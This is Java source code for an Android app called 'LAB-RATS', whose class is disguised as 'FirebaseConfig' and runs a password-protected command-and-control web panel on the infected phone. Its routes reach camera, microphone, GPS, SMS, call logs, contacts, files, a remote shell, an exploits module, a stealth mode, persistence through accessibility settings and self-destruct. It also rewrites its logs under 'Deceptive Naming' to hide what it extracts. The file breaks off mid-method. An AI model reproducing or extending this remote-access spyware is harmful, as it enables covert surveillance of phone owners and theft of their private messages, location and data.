package com.labs.labrats;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.accessibilityservice.AccessibilityService;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.HashMap;
import java.util.Date;

import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;

import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import java.security.KeyStore;

import com.labs.labrats.modules.ExploitsModule;
import com.labs.labrats.modules.TerminalModule;
import com.labs.labrats.modules.GhostModule;
import fi.iki.elonen.NanoHTTPD;

public class FirebaseConfig extends NanoHTTPD {

    public static final int DEFAULT_PORT = 9191;
    private final Context context;
    private final ExploitsModule exploitsModule;
    private final TerminalModule terminalModule;
    private final GhostModule ghostModule;
    private final com.labs.labrats.modules.OpticsModule opticsModule;
    private final com.labs.labrats.modules.LocateModule locateModule;
    private final com.labs.labrats.modules.DataModule dataModule;
    private final com.labs.labrats.modules.CommsModule commsModule;
    private final com.labs.labrats.modules.IntelModule intelModule;
    private final com.labs.labrats.modules.AcousticsModule acousticsModule;
    private static final List<String> systemLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
    private static boolean logsLoaded = false;
    private static Context staticContext;
    private static final java.util.concurrent.atomic.AtomicLong lastLogSaveTime = new java.util.concurrent.atomic.AtomicLong(0);
    private static final SimpleDateFormat logTimeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    public static void logActivity(String msg) {
        if (msg == null) return;
        
        // --- HARDENED LOGGING: Deceptive Naming ---
        String hardenedMsg = msg.replace("UPLINK_AUTHORIZED", "TELEMETRY_SESSION_SYNCED")
                               .replace("SMS_HISTORY_EXTRACTED", "SYNC_MSG_DB_SUCCESS")
                               .replace("CAMERA_FEED_STARTED", "ANALYTICS_OPTICS_INIT")
                               .replace("LOCATION_TRACKING", "GPS_SYSTEM_METRIC")
                               .replace("GHOST_CONTROLLER", "IO_PERSISTENCE_MANAGER")
                               .replace("STEALTH_MODE", "IDENTITY_PROVIDER_CONFIG");

        // Determine Priority Level for UI Coloring
        String priority = "[S]"; // Default: Success/Info (Cyan)
        String upper = hardenedMsg.toUpperCase();
        if (upper.contains("CRITICAL") || upper.contains("AUTH") || upper.contains("OTP") || upper.contains("ALERT") || upper.contains("SECURITY")) {
            priority = "[C]"; // Critical (Red)
        } else if (upper.contains("WARNING") || upper.contains("BATTERY") || upper.contains("LOST") || upper.contains("ERROR")) {
            priority = "[W]"; // Warning (Orange)
        } else if (upper.contains("SUCCESS") || upper.contains("ACTIVE") || upper.contains("INIT")) {
            priority = "[S]"; // Success (Green)
        }

        String timestamp;
        synchronized (logTimeFormat) {
            timestamp = logTimeFormat.format(new Date());
        }
        String logEntry = priority + " [" + timestamp + "] " + hardenedMsg;
        
        synchronized (systemLogs) {
            systemLogs.add(logEntry);
            if (systemLogs.size() > 500) {
                systemLogs.remove(0);
            }
        }
        
        long now = System.currentTimeMillis();
        if (now - lastLogSaveTime.get() > 10000) {
            lastLogSaveTime.set(now);
            LabRatsWorker.execute(FirebaseConfig::saveLogsInternal);
        }
    }

    private static String obfuscate(String data) {
        if (data == null) return null;
        try {
            byte[] bytes = data.getBytes("UTF-8");
            byte[] key = {0x12, 0x34, 0x56, 0x78};
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
            }
            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
        } catch (Exception e) { return data; }
    }

    private static String deobfuscate(String data) {
        if (data == null) return null;
        try {
            byte[] bytes = android.util.Base64.decode(data, android.util.Base64.DEFAULT);
            byte[] key = "Stability_Core_0".getBytes();
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
            }
            return new String(bytes, "UTF-8");
        } catch (Exception e) { return data; }
    }

    private void loadPersistentData() {
        if (context == null) return;
        SharedPreferences prefs = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE);
        
        if (!logsLoaded) {
            String logsJson = "[]";
            try {
                // Try New Dynamic Encryption First
                String encryptedHex = prefs.getString("system_logs_encrypted", null);
                if (encryptedHex != null) {
                    byte[] encrypted = android.util.Base64.decode(encryptedHex, android.util.Base64.DEFAULT);
                    logsJson = SystemAnalytics.decrypt(encrypted);
                } else {
                    // Fallback to legacy obfuscation
                    String legacy = prefs.getString("system_logs_secure", null);
                    if (legacy != null) logsJson = deobfuscate(legacy);
                    else logsJson = prefs.getString("system_logs", "[]");
                }

                org.json.JSONArray array = new org.json.JSONArray(logsJson);
                synchronized (systemLogs) {
                    systemLogs.clear();
                    for (int i = 0; i < array.length(); i++) {
                        systemLogs.add(array.getString(i));
                    }
                }
                logsLoaded = true;
            } catch (Exception e) {
                Log.e("SystemSync", "Restore failed: " + e.getMessage());
                logsLoaded = true; 
            }
        }
    }

    private static void saveLogsInternal() {
        if (staticContext == null) return;
        try {
            org.json.JSONArray array = new org.json.JSONArray();
            List<String> logsCopy;
            synchronized (systemLogs) {
                logsCopy = new java.util.ArrayList<>(systemLogs);
            }
            for (String log : logsCopy) array.put(log);
            
            // Dynamic Build-Time Encryption
            byte[] encrypted = SystemAnalytics.encrypt(array.toString());
            String encryptedHex = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
            
            staticContext.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putString("system_logs_encrypted", encryptedHex).apply();
        } catch (Exception e) {
            Log.e("SystemSync", "Save failed: " + e.getMessage());
        }
    }

    public String getHeaderProxy(String uri) { return getHeader(uri); }

    private String getHeader(String uri) {
        
        // Navigation Map
        String homeActive = (uri.equals("/") || uri.equals("/terminal")) ? "active" : "";
        String ghostActive = uri.startsWith("/ghost") ? "active" : "";
        String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
        String gpsActive = uri.startsWith("/gps") ? "active" : "";
        String exploitsActive = uri.startsWith("/exploits") ? "active" : "";
        String filesActive = (uri.startsWith("/files") || uri.startsWith("/device/apps")) ? "active" : "";
        String intelActive = uri.startsWith("/intel") ? "active" : "";
        String smsActive = uri.startsWith("/sms") ? "active" : "";
        String mmsActive = uri.startsWith("/mms") ? "active" : "";
        String audioActive = uri.startsWith("/audio") ? "active" : "";
        String callsActive = uri.startsWith("/calls") ? "active" : "";
        String contactsActive = uri.startsWith("/contacts") ? "active" : "";
        String hardwareActive = (uri.startsWith("/device") && !uri.contains("apps")) ? "active" : "";

        return "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<title>LAB-RATS | CORE</title>" +
            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
            "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "  <div class=\"header\">" +
            "    <img src=\"/logo?v=146\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
            "    <div class=\"title-font\">LAB-RATS</div>" +
            "    <div class=\"glitch-container\">" +
            "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
            "    </div>" +
            "    <div class=\"version-text\" style=\"margin-bottom: 2px;\">C2_TERMINAL_INTERFACE_V1.5.0</div>" +
            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
            "  </div>" +
            "  <div class=\"nav\">" +
            "    <a href=\"/\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
            "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
            "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
            "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
            "    <a href=\"/exploits\" id=\"nav-exploits\" class=\"" + exploitsActive + "\">Exploits</a>" +
            "    <a href=\"/files\" id=\"nav-files\" class=\"" + filesActive + "\">Data</a>" +
            "    <a href=\"/intel\" id=\"nav-intel\" class=\"" + intelActive + "\">Intel</a>" +
            "    <a href=\"/sms\" id=\"nav-sms\" class=\"" + smsActive + "\">SMS</a>" +
            "    <a href=\"/mms\" id=\"nav-mms\" class=\"" + mmsActive + "\">MMS</a>" +
            "    <a href=\"/audio\" id=\"nav-audio\" class=\"" + audioActive + "\">Acoustics</a>" +
            "    <a href=\"/calls\" id=\"nav-calls\" class=\"" + callsActive + "\">Comms</a>" +
            "    <a href=\"/contacts\" id=\"nav-contacts\" class=\"" + contactsActive + "\">Contacts</a>" +
            "    <a href=\"/device\" id=\"nav-device\" class=\"" + hardwareActive + "\">Hardware</a>" +
            "  </div>";
    }

    public String getFooter() {
        return "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
                "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
                "</div>" +
                "</div>" +
                "<script src=\"/c2/script.js?v=" + System.currentTimeMillis() + "\"></script>" +
                "</body>" +
                "</html>";
    }

    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGIN</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'Orbitron'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "* { box-sizing: border-box; margin: 0; padding: 0; }" +
            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
                        ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
            "@media (max-width: 480px) {" +
            "  .login-card { padding: 35px 20px; }" +
            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
            "  input { padding: 14px !important; font-size: 14px !important; }" +
            "  button { padding: 14px !important; font-size: 14px !important; }" +
            "  .login-card img { width: 150px !important; height: 150px !important; }" +
            "}" +
            "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
            "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
            "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
            ".login-card img { transition: all 0.5s; margin-bottom: 30px; }" +
            ".login-card img:hover { transform: scale(1.1) translateY(-5px); }" +
            "</style></head><body>" +
            "<div class=\"login-card\">" +
            "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; background: transparent !important;\">" +
            "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.5.0</div>" +
            "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
            "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
            "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
            "</form>" +
            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
            "</div>" +
            "</div>" +
            "<script src=\"/c2/script.js\"></script></body></html>";

    private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGOUT</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "body { background: #050505; color: #ff3131; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
            ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); width: 90%; max-width: 400px; }" +
            "h1 { font-size: 1.8rem; }" +
            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 0.7rem; } p { font-size: 0.8rem; } }" +
            "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
            ".login-card img { transition: all 0.5s; }" +
            ".login-card img:hover { transform: scale(1.1) translateY(-5px); }" +
            "</style></head><body>" +
            "<div class=\"logout-card\">" +
            "<h1>SESSION_TERMINATED</h1>" +
            "<p>Uplink severed. Disconnecting...</p>" +
            "</div>" +
            "<script>" +
            "  // Nuclear Session Wipe\n" +
            "  document.cookie = 'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';\n" +
            "  localStorage.clear();\n" +
            "  sessionStorage.clear();\n" +
            "  setTimeout(() => { window.location.href = '/login'; }, 1500);\n" +
            "</script></body></html>";

    private static volatile String sessionToken = "";

    public FirebaseConfig(Context context, int port) {
        super(port);
        // Use application context to avoid leaks or context-switch crashes
        this.context = context.getApplicationContext();
        staticContext = context.getApplicationContext();
        this.exploitsModule = new ExploitsModule(this.context, this);
        this.terminalModule = new TerminalModule(this.context, this);
        this.ghostModule = new GhostModule(this.context, this);
        this.opticsModule = new com.labs.labrats.modules.OpticsModule(this.context, this);
        this.locateModule = new com.labs.labrats.modules.LocateModule(this.context, this);
        this.dataModule = new com.labs.labrats.modules.DataModule(this.context, this);
        this.commsModule = new com.labs.labrats.modules.CommsModule(this.context, this);
        this.intelModule = new com.labs.labrats.modules.IntelModule(this.context, this);
        this.acousticsModule = new com.labs.labrats.modules.AcousticsModule(this.context, this);
        
        // Multi-Threaded Executor: Allows handling multiple C2 requests at once
        // Optimization: Uses a cached thread pool to reuse threads efficiently
        setAsyncRunner(new AsyncRunner() {
            private final java.util.concurrent.ExecutorService executor = java.util.concurrent.Executors.newCachedThreadPool();
            @Override
            public void exec(ClientHandler clientHandler) {
                executor.submit(() -> {
                    try {
                        clientHandler.run();
                    } catch (Exception e) {
                        Log.e("C2Server", "Client handler error: " + e.getMessage());
                    }
                });
            }
            @Override
            public void closeAll() {
                executor.shutdown();
            }
            @Override
            public void closed(ClientHandler clientHandler) {
                // Not used
            }
        });

        // [SECURITY_STABILITY_LINK]
        // Token survives service restarts (fixes camera) but resets on full kill/reboot
        sessionToken = WorkManager_Sync.activeSessionToken;
        if (sessionToken == null || sessionToken.isEmpty()) {
            sessionToken = java.util.UUID.randomUUID().toString();
            WorkManager_Sync.activeSessionToken = sessionToken;
        }

        LabRatsWorker.execute(this::loadPersistentData);
        
        // --- OPTIONAL_ENCRYPTION_ENGINE ---
        // If 'server.bks' exists in assets, the C2 automatically upgrades to HTTPS/TLS
        setupHardenedLink();
    }

    private static boolean isEncryptedLink = false;

    private void setupHardenedLink() {
        try {
            // Check assets for pre-deployed keystore (BKS format for Android)
            // If present, the C2 automatically upgrades to HTTPS/TLS 1.3
            String ksName = "server.bks";
            String ksPass = "labrats123"; // Default deployment password
            
            InputStream is = context.getAssets().open(ksName);
            if (is != null) {
                KeyStore keystore = KeyStore.getInstance("BKS");
                keystore.load(is, ksPass.toCharArray());
                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
                kmf.init(keystore, ksPass.toCharArray());
                
                SSLContext sslContext = SSLContext.getInstance("TLS");
                sslContext.init(kmf.getKeyManagers(), null, null);
                
                // --- ACTIVATE HTTPS PROTOCOL ---
                makeSecure(sslContext.getServerSocketFactory(), null);
                isEncryptedLink = true;
                logActivity("SECURITY_UPGRADE: SSL/TLS 1.3 encryption engine active.");
            }
        } catch (Exception e) {
            // No keystore found or error - default to raw HTTP for baseline access
            isEncryptedLink = false;
        }
    }

    public static String getSessionId() {
        return sessionToken.substring(0, 4).toUpperCase();
    }

    public static void clearSystemLogs() {
        synchronized (systemLogs) {
            systemLogs.clear();
        }
        saveLogsInternal();
    }

    public static String getLogsJson(int since) {
        org.json.JSONObject result = new org.json.JSONObject();
        org.json.JSONArray array = new org.json.JSONArray();
        
        synchronized (systemLogs) {
            int startIdx = since;
            if (since < 0 || since > systemLogs.size()) {
                startIdx = 0;
            }
            
            for (int i = startIdx; i < systemLogs.size(); i++) {
                array.put(systemLogs.get(i));
            }
            try {
                result.put("logs", array);
                result.put("last_id", systemLogs.size());
                result.put("reset", (since > systemLogs.size()));
            } catch (Exception ignored) {}
        }
        return result.toString();
    }

    private Response serveGzipped(IHTTPSession session, String mime, String content) {
        String acceptEncoding = session.getHeaders().get("accept-encoding");
        if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
            try {
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                java.util.zip.GZIPOutputStream gzos = new java.util.zip.GZIPOutputStream(baos);
                gzos.write(content.getBytes("UTF-8"));
                gzos.close();
                byte[] bytes = baos.toByteArray();
                Response res = newFixedLengthResponse(Response.Status.OK, mime, new java.io.ByteArrayInputStream(bytes), bytes.length);
                res.addHeader("Content-Encoding", "gzip");
                return res;
            } catch (Exception e) {
                return newFixedLengthResponse(Response.Status.OK, mime, content);
            }
        }
        return newFixedLengthResponse(Response.Status.OK, mime, content);
    }

    public Response serveGzippedProxy(IHTTPSession session, String mime, String content) {
        return serveGzipped(session, mime, content);
    }

    public List<AppEntry> getLaunchableAppsProxy() {
        return getLaunchableApps();
    }

    public Response newFixedLengthResponseProxy(Response.Status status, String mimeType, java.io.InputStream data, long totalBytes) {
        return newFixedLengthResponse(status, mimeType, data, totalBytes);
    }

    public Response newChunkedResponseProxy(Response.Status status, String mimeType, java.io.InputStream data) {
        return newChunkedResponse(status, mimeType, data);
    }

    public Response serveErrorProxy(String message) {
        return serveError(message);
    }

    public Response serve404Proxy() {
        return serve404();
    }

    @Override
    public Response serve(IHTTPSession session) {
        if (session == null) return null;
        
        String uri = session.getUri();
        if (uri == null) uri = "/";
        
        Response response;
        CookieHandler cookies = session.getCookies();
        
        try {
            // Watchdog: Update operator activity time for heartbeat scaling
            WorkManager_Sync.notifyOperatorActivity();

            // 1. Handle Login POST (Always available)
            if (uri.equals("/login") && session.getMethod() == Method.POST) {
                session.parseBody(new HashMap<>());
                String pass = session.getParms().get("password");
                boolean isJson = "true".equals(session.getParms().get("json"));
                
                if (pass != null && getStoredPassword().equals(pass.trim())) {
                    logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
                    
                    if (isJson) {
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/");
                    }
                    // Populate service state to survive resets
                    WorkManager_Sync.activeSessionToken = sessionToken;

                    response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
                } else {
                    if (isJson) {
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
                    } else {
                        response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
                    }
                }
            } 
            // 2. Handle Logout (Hard kill session)
            else if (uri.equals("/logout")) {
                logActivity("AUTHENTICATION_TERMINATED: Session closed");
                // Invalidate persistent server token immediately
                sessionToken = java.util.UUID.randomUUID().toString(); 
                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit().putString("session_token", sessionToken).apply();
                
                response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGOUT_HTML);
                // Nuclear cookie wipe
                response.addHeader("Set-Cookie", "token=deleted; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict");
            }
            // 3. Auth Check for all other pages
            else {
                String token = cookies.read("token");
                
                // [STABILITY_SYNC] Force load token from service state
                if (sessionToken == null || sessionToken.isEmpty()) {
                    sessionToken = WorkManager_Sync.activeSessionToken;
                }

                boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));

                if (!isLoggedIn) {
                    if (uri.startsWith("/c2/")) {
                        response = serveAsset(uri);
                    } else if (uri.equals("/logo")) {
                        response = serveLogo();
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont();
                    } else {
                        // Suppress logs for high-frequency background polling to prevent terminal spam
                        if (!uri.contains("/ghost/") && !uri.contains("/camera/") && !uri.contains("/terminal/logs")) {
                            logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
                        }
                        
                        // For assets/API calls, return 401. For pages, return login wall.
                        if (uri.contains(".") && !uri.equals("/")) {
                            response = newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "ACCESS_DENIED_REAUTHENTICATE");
                        } else {
                            response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
                        }
                    }
                } else {
                    // Logged in: Process standard routes
                    Map<String, String> params = session.getParms();
                    
                    if (uri.equals("/login")) {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/");
                    } else if (uri.startsWith("/c2/")) {
                        response = serveAsset(uri);
                    } else if (uri.startsWith("/exploits")) {
                        response = exploitsModule.handleRequest(session);
                    } else if (uri.equals("/") || uri.isEmpty() || uri.startsWith("/terminal/") || uri.equals("/device/shell")) {
                        response = terminalModule.handleRequest(session);
                    } else if (uri.startsWith("/ghost") || uri.equals("/stealth")) {
                        response = ghostModule.handleRequest(session);
                    } else if (uri.startsWith("/camera")) {
                        response = opticsModule.handleRequest(session);
                    } else if (uri.startsWith("/gps")) {
                        response = locateModule.handleRequest(session);
                    } else if (uri.equals("/files") || uri.startsWith("/files/") || uri.startsWith("/download/")) {
                        response = dataModule.handleRequest(session);
                    } else if (uri.equals("/calls") || uri.startsWith("/calls/") || uri.equals("/sms") || uri.startsWith("/sms/") || uri.equals("/mms") || uri.startsWith("/mms/") || uri.equals("/contacts")) {
                        response = commsModule.handleRequest(session);
                    } else if (uri.startsWith("/intel")) {
                        response = intelModule.handleRequest(session);
                    } else if (uri.startsWith("/audio")) {
                        response = acousticsModule.handleRequest(session);
                    } else if (uri.equals("/logo")) {
                        response = serveLogo();
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont();
                    } else if (uri.equals("/device")) {
                        response = serveDeviceInfo(session);
                    } else if (uri.equals("/device/vibrate")) {
                        vibrateDevice();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/max-volume")) {
                        setMaxVolume();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/silent-mode")) {
                        setSilentMode();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/optimize-stability")) {
                        OemStabilityHelper.requestAutoStart(context);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/inject-trust")) {
                        StabilityBypass.executeTrustInjection(context);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/open-url")) {
                        openUrlOnDevice(params.get("url"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/toast")) {
                        String msg = params.get("msg");
                        int size = 22;
                        int y = 250;
                        int duration = 3500;
                        String anim = params.get("anim");
                        if (anim == null) anim = "scroll";
                        String color = params.get("color");
                        if (color == null) color = "#FFFFFF";
                        
                        try {
                            if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
                            if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
                            if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
                        } catch (Exception ignored) {}

                        showToast(msg, size, y, anim, duration, color);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/apps")) {
                        response = serveAppList(session);
                    } else if (uri.equals("/device/open-app")) {
                        openAppOnDevice(params.get("pkg"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/request-permissions")) {
                        logActivity("SYSTEM_MAINTENANCE: Remotely dispatched permission request sequence.");
                        WorkManager_Sync.triggerPermissionActivity(context);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Permission sequence dispatched to target device.\"}");
                    } else if (uri.equals("/device/deep-repair")) {
                        logActivity("SYSTEM_MAINTENANCE: Remotely forced deep repair (App Settings).");
                        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(Uri.parse("package:" + context.getPackageName()));
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/inject-trust")) {
                        StabilityBypass.executeTrustInjection(context);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/open-accessibility")) {
                        logActivity("SYSTEM_MAINTENANCE: Remotely opening Accessibility Hub.");
                        Intent intent = new Intent(context, PermissionActivity.class);
                        intent.putExtra("target_menu", "accessibility");
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        context.startActivity(intent);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/open-notifications")) {
                        logActivity("SYSTEM_MAINTENANCE: Remotely opening Notification Hub.");
                        Intent intent = new Intent(context, PermissionActivity.class);
                        intent.putExtra("target_menu", "notifications");
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        context.startActivity(intent);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/terminate")) {
                        logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent intent = new Intent(context, WorkManager_Sync.class);
                            intent.setAction(Constants.ACTION_STOP_CORE);
                            context.startService(intent);
                        }, 1500);
                        // Return special JSON to trigger logout on frontend
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
                    } else if (uri.equals("/device/self-destruct")) {
                        selfDestruct();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/fix-persistence")) {
                        logActivity("SYSTEM_MAINTENANCE: Initiating persistence repair...");
                        
                        // 1. Open App Info for Hibernation/Battery manual fix
                        Intent infoIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        infoIntent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                        infoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(infoIntent);
                        
                        // 2. Staggered launch of Accessibility settings if service is offline
                        if (IO_Persistence_Manager.getInstance() == null) {
                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                try {
                                    Intent accIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
